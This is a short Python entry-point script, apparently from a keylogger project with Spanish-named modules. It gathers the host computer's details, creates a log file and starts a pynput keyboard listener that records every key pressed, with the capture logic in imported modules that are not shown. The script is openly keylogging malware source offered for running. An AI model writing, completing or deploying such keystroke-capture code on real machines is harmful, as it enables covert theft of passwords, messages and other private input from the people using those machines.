from datos_computador import *
from keylogger import *
import platform
import ctypes
import os
from pynput import keyboard

if __name__ == "__main__":
    Dao.getDatosComputador()
    Keylogger.crearArchivo()
    with Listener(on_press = Keylogger.detectarTeclaPresionada) as Listener:
        Listener.join()